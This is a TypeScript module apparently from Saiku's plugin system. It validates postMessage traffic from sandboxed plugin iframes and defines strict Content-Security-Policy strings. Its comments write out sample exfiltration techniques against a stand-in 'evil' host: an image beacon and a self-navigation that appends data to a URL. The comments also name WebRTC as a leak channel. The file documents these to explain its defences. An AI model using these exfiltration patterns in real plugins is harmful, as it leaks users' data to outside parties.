/*
 * Host side of the sandboxed-plugin postMessage protocol (App Builder Phase 2,
 * Task 7, saiku#1441).
 *
 * SECURITY BOUNDARY. A `plugin` tile runs ARBITRARY author JavaScript inside a
 * locked-down iframe (sandbox="allow-scripts", strict CSP, opaque "null"
 * origin). The host and the plugin talk ONLY through window.postMessage, and
 * this module is the host's parser/validator for everything the plugin sends.
 *
 * Design rules that make it airtight:
 *   - This module is PURE (no DOM, no fetch, no imports). It only parses +
 *     validates the message shape and clamps numbers. Every host action (set
 *     iframe height, resolve a filter against the live cube, show an error)
 *     lives in the component and consumes ONLY the typed, validated result
 *     returned here — the raw plugin payload never reaches the host DOM.
 *   - Authentication is a per-mount cryptographic `nonce`. A sandboxed frame's
 *     origin is the string "null", so event.origin is useless as an
 *     authenticator; instead every plugin→host message MUST echo the nonce the
 *     host injected into that frame's document. Wrong/absent nonce → dropped.
 *   - Fail closed: any shape we don't recognise returns null (ignored).
 *
 * The component ALSO guards event.source === iframe.contentWindow before this
 * ever runs, so one tile's host can never process another frame's messages —
 * the nonce is the second, defence-in-depth authenticator.
 */

/** Clamp bounds for a plugin-requested iframe height (px). A plugin cannot make
 *  its tile collapse to nothing or grow unboundedly to cover the host chrome. */
export const PLUGIN_MIN_H = 40;
export const PLUGIN_MAX_H = 4000;

/** A validated, server-resolvable filter selection (captions/levels the host
 *  will re-resolve against the live cube — NOT trusted MDX). */
export interface FilterSel {
	dimension: string;
	hierarchy: string;
	level: string;
	members: string[];
}

/** Host → plugin envelope. `nonce` lets the plugin ignore stray messages too. */
export interface HostToPlugin {
	type: 'init' | 'data' | 'theme' | 'resize';
	nonce: string;
	payload: unknown;
}

/** Every message shape a plugin is permitted to send the host. */
export type PluginToHost =
	| { type: 'ready'; nonce: string }
	| { type: 'resize'; nonce: string; height: number }
	| {
			type: 'filter';
			nonce: string;
			dimension: string;
			hierarchy: string;
			level: string;
			members: string[];
	  }
	| { type: 'error'; nonce: string; message: string };

/** Max members a single filter message may carry (anti-DoS). */
const MAX_FILTER_MEMBERS = 500;
/** Max length of a plugin error string surfaced in the tile chrome. */
const MAX_ERROR_LEN = 500;

/**
 * Parse + validate one raw plugin→host message against the expected nonce.
 *
 * Returns a narrow, typed result the component can act on, or `null` when the
 * message is unauthenticated or malformed (the component then ignores it).
 * NEVER throws — a plugin must not be able to crash the host by sending junk.
 */
export function handlePluginMessage(
	raw: unknown,
	expectNonce: string
):
	| { kind: 'ready' }
	| { kind: 'resize'; height: number }
	| { kind: 'filter'; sel: FilterSel }
	| { kind: 'error'; message: string }
	| null {
	if (!raw || typeof raw !== 'object') return null;
	const m = raw as Record<string, unknown>;
	// Authenticate: the sandboxed frame origin is "null", so the nonce — injected
	// per-mount into this frame's document — is the only trustworthy authenticator.
	if (m.nonce !== expectNonce) return null;
	switch (m.type) {
		case 'ready':
			return { kind: 'ready' };
		case 'resize': {
			// Only coerce number / numeric-string heights. Coercing an arbitrary
			// object can THROW (e.g. Number({toString: []}) → TypeError), which would
			// violate the never-throws contract — so reject non-primitive heights.
			if (typeof m.height !== 'number' && typeof m.height !== 'string') return null;
			const h = Number(m.height);
			if (!Number.isFinite(h)) return null;
			return {
				kind: 'resize',
				height: Math.min(PLUGIN_MAX_H, Math.max(PLUGIN_MIN_H, Math.round(h)))
			};
		}
		case 'filter': {
			if (
				typeof m.dimension !== 'string' ||
				typeof m.hierarchy !== 'string' ||
				typeof m.level !== 'string'
			) {
				return null;
			}
			const members = Array.isArray(m.members)
				? m.members.filter((x): x is string => typeof x === 'string').slice(0, MAX_FILTER_MEMBERS)
				: [];
			return {
				kind: 'filter',
				sel: { dimension: m.dimension, hierarchy: m.hierarchy, level: m.level, members }
			};
		}
		case 'error':
			return { kind: 'error', message: String(m.message ?? '').slice(0, MAX_ERROR_LEN) };
		default:
			return null;
	}
}

/**
 * The strict Content-Security-Policy every plugin frame is locked to. It is the
 * SECOND containment layer behind the iframe sandbox:
 *   - default-src 'none'     → deny everything not explicitly re-allowed below
 *                              (fonts, frames, workers, media, objects, …)
 *   - script-src 'unsafe-inline' → the plugin's own inline JS may run (that's
 *                              the whole point) but NO external script URLs
 *   - style-src 'unsafe-inline'  → inline styles only, no remote stylesheets
 *   - img-src data:          → only inline data: images (blocks the classic
 *                              <img src="https://evil…"> subresource beacon)
 *   - connect-src 'none'     → blocks BACKGROUND subresource egress: fetch, XHR,
 *                              WebSocket, EventSource, sendBeacon
 *
 * IMPORTANT — what this does NOT stop. The fetch directives above govern
 * SUBRESOURCE requests only, not the frame navigating ITSELF
 * (`location = "https://evil/?d=" + data`). In the app that navigation is checked
 * against the PARENT's policy instead: the shell enforces `default-src 'self'`
 * (frame-src fallback, saiku#1917), so a cross-origin or data:/blob: target is
 * refused; a same-origin target stays at the opaque origin. On the embed surface
 * the third-party host page's policy decides. Channels no CSP directive governs
 * remain (WebRTC: `connect-src` does not cover RTCPeerConnection in Chromium), so
 * a plugin can still exfiltrate the data shown in ITS OWN tile. The sandbox
 * (allow-scripts, no allow-same-origin) still isolates the Saiku origin — a plugin
 * cannot read the parent DOM, cookies, the session token, or any other-origin
 * data — but the tile's own rows are not confidential FROM the plugin. That is
 * why plugins are ADMIN-INSTALLED trusted code (like a server plugin JAR): an
 * admin who installs a plugin trusts it with the data that plugin's tile
 * displays. See docs/APP-BUILDER-PLUGINS.md.
 */
export const PLUGIN_CSP =
	"default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'";

/**
 * The in-app plugin frame document (saiku#2440), relative to the app's base path
 * (`/ui/plugin-frame.html` in the launcher). It is a static bootstrap, not plugin markup.
 *
 * Why not `srcdoc`: an about:srcdoc document inherits its parent's CSP, and the SPA shell
 * enforces `script-src 'self' 'sha256-…'` (saiku#1917), which blocks the plugin's inline
 * script. A NETWORK-loaded frame does not inherit the parent's policy; it gets the one its
 * own response carries, {@link PLUGIN_FRAME_CSP}. The bootstrap then receives the plugin
 * document (built by {@link buildSrcdoc}) from the host over postMessage and writes it into
 * itself, so the server never reflects caller-supplied HTML and the plugin markup still
 * comes only from the admin registry fetch the tile already makes.
 */
export const PLUGIN_FRAME_PATH = 'plugin-frame.html';

/**
 * The enforced policy the plugin frame RESPONSE carries (saiku#2440). Mirrors
 * `SecurityHeadersFilter.PLUGIN_FRAME_CSP` (the launcher) and the dev/preview header in
 * vite.config.ts; the server appends `frame-ancestors` (the UI's configured value, always
 * including 'self', since the frame's parent is the SPA).
 *   - sandbox allow-scripts → the document runs at an opaque origin with no
 *                             forms/popups/top-navigation even when loaded without the
 *                             tile's sandboxed iframe (opened top-level, or framed with no
 *                             sandbox attribute); the iframe's own sandbox="allow-scripts"
 *                             says the same
 *   - the rest is {@link PLUGIN_CSP} plus base-uri / form-action 'none'.
 */
export const PLUGIN_FRAME_CSP =
	"sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'; " +
	"style-src 'unsafe-inline'; img-src data:; connect-src 'none'; base-uri 'none'; " +
	"form-action 'none'";

/** Bootstrap → host: "I am loaded, send me the plugin document". Carries nothing else. */
export const FRAME_BOOT_TYPE = 'saiku-plugin-frame-boot';
/** Host → bootstrap: the plugin document to write into the frame. */
export const FRAME_LOAD_TYPE = 'saiku-plugin-load';

/**
 * True when `raw` is the bootstrap's boot message AND it came from an opaque origin.
 *
 * The component has already checked `event.source === iframe.contentWindow`. Requiring
 * `event.origin === "null"` on top means the host only ever hands plugin code to a frame
 * that really is sandboxed: if the sandbox were somehow missing (a same-origin frame would
 * report the Saiku origin), the plugin is never delivered. Pure, never throws.
 */
export function isFrameBootMessage(raw: unknown, origin: string): boolean {
	if (origin !== 'null' || !raw || typeof raw !== 'object') return false;
	return (raw as Record<string, unknown>).type === FRAME_BOOT_TYPE;
}

/**
 * Decide what the host does with one message event, for the tile whose frame window is
 * `frame.window` (saiku#2440). The single place the host's guards live, so they are unit
 * tested rather than inlined in the component:
 *   1. `event.source` must be THIS tile's frame window. Every other window (other tiles, the
 *      top window, injected frames, openers) is ignored. `event.origin` cannot authenticate a
 *      plugin: an opaque frame's origin is "null".
 *   2. A bootstrap boot message is answered only from an opaque ("null") origin, i.e. a frame
 *      that really is sandboxed, and only with this tile's registry html (`pluginHtml`).
 *   3. Everything else must pass {@link handlePluginMessage} (nonce + shape).
 *
 * The boot handshake itself is unauthenticated by design: whatever document sits in the tile's
 * frame at an opaque origin may ask for the plugin document and its nonce. What keeps a foreign
 * document out of that frame is the shell's enforced `default-src 'self'` (frame-src fallback,
 * kit.config.js): an ancestor that navigates the tile frame elsewhere is refused. Never give
 * the shell a frame-src wider than 'self' without revisiting this.
 */
export function routeFrameMessage(
	event: { source: unknown; origin: string; data: unknown },
	frame: { window: unknown; nonce: string; pluginHtml: string | null }
):
	| { kind: 'deliver'; message: { type: typeof FRAME_LOAD_TYPE; html: string } }
	| { kind: 'plugin'; msg: NonNullable<ReturnType<typeof handlePluginMessage>> }
	| null {
	if (!frame.window || event.source !== frame.window) return null;
	if (isFrameBootMessage(event.data, event.origin)) {
		return frame.pluginHtml
			? { kind: 'deliver', message: buildFrameLoadMessage(frame.pluginHtml, frame.nonce) }
			: null;
	}
	const msg = handlePluginMessage(event.data, frame.nonce);
	return msg ? { kind: 'plugin', msg } : null;
}

/** The host → bootstrap message carrying the full plugin document for this mount. */
export function buildFrameLoadMessage(
	pluginHtml: string,
	nonce: string
): { type: typeof FRAME_LOAD_TYPE; html: string } {
	return { type: FRAME_LOAD_TYPE, html: buildSrcdoc(pluginHtml, nonce) };
}

/** The slug rule a plugin id must satisfy — MUST mirror the backend's
 *  {@code TilePluginParser.SAFE_ID} ([a-z0-9] start, then [a-z0-9-], 1–64 chars).
 *  A tile only ever references a plugin by this id; it never carries markup. */
export const PLUGIN_ID_RE = /^[a-z0-9][a-z0-9-]{0,63}$/;

/**
 * Validate + normalise a plugin tile's options blob. Shape only:
 * `{ pluginId: string }` (plus any author config passed through untouched).
 *
 * SECURITY (saiku#1441): a plugin tile references an ADMIN-INSTALLED plugin by
 * its slug id — it NEVER carries raw HTML. The markup is served only from the
 * admin registry (`/rest/saiku/api/tile-plugins/{id}/html` in-app, or the
 * token-scoped `/embed/app/{path}/plugin/{id}/html` on the embed surface). A
 * legacy `html` field is rejected so no arbitrary author markup can ride tile
 * config into a plugin frame.
 */
export function validatePluginOptions(
	options: unknown
): { ok: true; value: Record<string, unknown> } | { ok: false; error: string } {
	if (options === null || options === undefined) {
		return { ok: true, value: {} };
	}
	if (typeof options !== 'object') {
		return { ok: false, error: 'Plugin options must be an object.' };
	}
	const o = options as Record<string, unknown>;
	// Refuse the old arbitrary-HTML channel outright (see saiku#1441): plugin HTML
	// must come from the admin registry, never from tile config.
	if (o.html !== undefined) {
		return {
			ok: false,
			error:
				'Inline plugin `html` is no longer supported — reference an installed plugin by `pluginId`.'
		};
	}
	if (o.pluginId !== undefined) {
		if (typeof o.pluginId !== 'string' || !PLUGIN_ID_RE.test(o.pluginId)) {
			return {
				ok: false,
				error: 'Plugin `pluginId` must be a slug matching [a-z0-9-] (1–64 chars).'
			};
		}
	}
	return { ok: true, value: { ...o } };
}

/** Keep only characters that are safe inside a JS string / HTML — our own
 *  generated nonce is already in this set; this is belt-and-braces so a
 *  hostile nonce could never break out of the injected <script> context. */
function safeNonce(nonce: string): string {
	return String(nonce).replace(/[^A-Za-z0-9_-]/g, '');
}

/**
 * Wrap the author's self-contained plugin HTML into a full document, with the
 * strict CSP meta as the FIRST element in <head> and the nonce exposed as a JS
 * const the plugin reads to stamp its messages. In-app it is posted into the
 * {@link PLUGIN_FRAME_PATH} bootstrap (saiku#2440); the embed bundle still uses
 * it as an iframe `srcdoc` (there the host page, not Saiku, owns the CSP).
 *
 * PURE / string-only — no DOM. The author HTML is embedded verbatim in <body>;
 * containment is the sandbox attribute + the CSP above, NOT any sanitising of
 * the author code (arbitrary JS is the feature).
 */
export function buildSrcdoc(pluginHtml: string, nonce: string): string {
	const n = safeNonce(nonce);
	// CSP meta MUST be first so it governs everything that follows. The nonce
	// const is emitted via JSON.stringify over the sanitised value (defence in
	// depth) so it can never terminate the script early.
	return (
		'<!DOCTYPE html><html><head>' +
		`<meta http-equiv="Content-Security-Policy" content="${PLUGIN_CSP}">` +
		'<meta charset="utf-8">' +
		'<meta name="viewport" content="width=device-width, initial-scale=1">' +
		`<script>window.SAIKU_PLUGIN_NONCE=${JSON.stringify(n)};</script>` +
		'</head><body>' +
		(typeof pluginHtml === 'string' ? pluginHtml : '') +
		'</body></html>'
	);
}
